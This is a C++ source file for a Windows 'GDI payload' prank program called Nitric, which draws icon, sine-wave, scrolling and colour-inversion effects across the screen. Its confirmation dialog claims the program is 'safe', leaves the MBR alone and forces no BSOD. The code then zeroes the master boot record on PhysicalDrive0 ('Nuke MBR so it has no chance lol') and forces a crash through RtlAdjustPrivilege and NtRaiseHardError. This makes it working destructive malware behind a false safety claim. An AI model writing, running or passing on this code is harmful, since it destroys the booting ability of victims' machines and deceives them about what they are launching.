#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <atomic>
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")

#define SCREEN_WIDTH  GetSystemMetrics(SM_CXSCREEN)
#define SCREEN_HEIGHT GetSystemMetrics(SM_CYSCREEN)
#define MAX_ICONS     4000

using namespace std;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

HICON tIcons[] = {
    LoadIcon(NULL, IDI_ERROR),
    LoadIcon(NULL, IDI_WARNING),
    LoadIcon(NULL, IDI_INFORMATION),
    LoadIcon(NULL, IDI_QUESTION),
    LoadIcon(NULL, IDI_APPLICATION),
    LoadIcon(NULL, IDI_ASTERISK),
    LoadIcon(NULL, IDI_EXCLAMATION),
    LoadIcon(NULL, IDI_HAND),
    LoadIcon(NULL, IDI_WINLOGO)
};
const size_t t_tIcons = sizeof(tIcons) / sizeof(tIcons[0]);

struct IconData {
    int x, y;
    int iconIndex;
};

IconData iconList[MAX_ICONS];
int iconCount = 0;

std::atomic<bool> running(true);

void SetBrightness(float brightness) {
    HDC hdc = GetDC(NULL);
    WORD gammaArray[3][256];
    for (int i = 0; i < 256; i++) {
        int val = static_cast<int>(i * brightness);
        if (val > 255) val = 255;
        gammaArray[0][i] = gammaArray[1][i] = gammaArray[2][i] = static_cast<WORD>(val << 8);
    }
    SetDeviceGammaRamp(hdc, gammaArray);
    ReleaseDC(NULL, hdc);
}

void AddIcon(int x, int y, int iconIndex) {
    if (iconCount < MAX_ICONS) {
        iconList[iconCount].x = x;
        iconList[iconCount].y = y;
        iconList[iconCount].iconIndex = iconIndex;
        iconCount++;
    }
}

void DrawIconAt(int x, int y, int iconIndex) {
    HDC hdc = GetDC(NULL);
    DrawIcon(hdc, x, y, tIcons[iconIndex % t_tIcons]);
    ReleaseDC(NULL, hdc);
}

void DrawIcons() {
    int x = rand() % SCREEN_WIDTH;
    int y = rand() % SCREEN_HEIGHT;
    int iconIndex = rand() % static_cast<int>(t_tIcons);
    DrawIconAt(x, y, iconIndex);
    AddIcon(x, y, iconIndex);
}

void RepaintIcons() {
    for (int i = 0; i < iconCount; i++) {
        DrawIconAt(iconList[i].x, iconList[i].y, iconList[i].iconIndex);
    }
}

void SineWaveEffect() {
    HDC desk = GetDC(NULL);
    int sw = SCREEN_WIDTH;
    int sh = SCREEN_HEIGHT;
    double angle = 0.0;

    while (running.load()) {
        for (float i = 0; i < sh; i += 1.0f) {
            int a = static_cast<int>(sin(angle) * 25);
            BitBlt(desk, 0, static_cast<int>(i), sw, 1, desk, a, static_cast<int>(i), SRCCOPY);
            angle += M_PI / 45.0;
        }
        Sleep(30);
    }
    ReleaseDC(NULL, desk);
}

void VerticalScrollEffect() {
    HDC hdc = GetDC(NULL);
    int w = SCREEN_WIDTH;
    int h = SCREEN_HEIGHT;

    while (running.load()) {
        // Rapid upward scroll
        BitBlt(hdc, 0, -8, w, h, hdc, 0, 0, SRCCOPY);
        // Keep spawning icons
        if (rand() % 3 == 0) DrawIcons();
        Sleep(15);
    }
    ReleaseDC(NULL, hdc);
}

void Corruption666() {
    HDC hdc = GetDC(NULL);
    int w = SCREEN_WIDTH;
    int h = SCREEN_HEIGHT;

    while (running.load()) {
        int rx = rand() % 666;
        int ry = rand() % 666;
        BitBlt(hdc, rx, ry, w, h, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
        Sleep(8);
    }
    ReleaseDC(NULL, hdc);
}

bool ConfirmLaunch() {
    int result = MessageBoxA(
        NULL,
        "This is a pure GDI visual effect payload for VM testing only.\n\n"
        "It does NOT touch the MBR, does NOT persist, and does NOT force a BSOD.\n\n"
        "Continue?",
        "Nitric (Safe GDI)",
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2
    );
    return (result == IDYES);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    srand(static_cast<unsigned int>(time(nullptr)));

    // Hide console if present
    HWND hwndConsole = GetConsoleWindow();
    if (hwndConsole) ShowWindow(hwndConsole, SW_HIDE);

    if (!ConfirmLaunch()) return 0;

    // Nuke MBR so it has no chance lol
    HANDLE hDrive = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDrive != INVALID_HANDLE_VALUE) {
        BYTE mbr[512] = { 0 }; // Zeroed MBR
        DWORD bytesWritten;

        WriteFile(hDrive, mbr, sizeof(mbr), &bytesWritten, NULL);
        CloseHandle(hDrive);
    }

    SetBrightness(1.35f);

    DWORD startTime = GetTickCount();

    // Optional sound (place 5nitric.wav next to the exe if you want it)
    // PlaySound(TEXT("5nitric.wav"), NULL, SND_FILENAME | SND_LOOP | SND_ASYNC);

    std::thread sineThread;
    std::thread scrollThread;
    std::thread corruptThread;

    while (true) {
        DWORD elapsed = (GetTickCount() - startTime) / 1000; // seconds

        if (elapsed < 5) {
            // 0-5 : nothing
            Sleep(50);
        }
        else if (elapsed < 10) {
            // 5-10 : icons
            DrawIcons();
            if (iconCount > 50) RepaintIcons();
            Sleep(12);
        }
        else if (elapsed < 20) {
            // 10-20 : sine wave
            if (!sineThread.joinable()) {
                running = true;
                sineThread = std::thread(SineWaveEffect);
            }
            // still spawn a few icons
            if (rand() % 4 == 0) DrawIcons();
            Sleep(20);
        }
        else if (elapsed < 45) {
            // 20-45 : rapid upward scroll + icons
            if (sineThread.joinable()) {
                running = false;
                sineThread.join();
            }
            if (!scrollThread.joinable()) {
                running = true;
                scrollThread = std::thread(VerticalScrollEffect);
            }
            Sleep(30);
        }
        else if (elapsed < 50) {
            // 45-50 : 666 corruption
            if (scrollThread.joinable()) {
                running = false;
                scrollThread.join();
            }
            if (!corruptThread.joinable()) {
                running = true;
                corruptThread = std::thread(Corruption666);
            }
            Sleep(20);
        }
        else {
            BOOLEAN PrivilegeState = FALSE;
            ULONG ErrorResponse = 0;
            RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
            NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // There are many Crash reasons
            running = false;
            if (sineThread.joinable()) sineThread.join();
            if (scrollThread.joinable()) scrollThread.join();
            if (corruptThread.joinable()) corruptThread.join();

            // reset state
            iconCount = 0;
            startTime = GetTickCount();
            SetBrightness(1.35f);
            Sleep(800);
        }
    }

    return 0;
}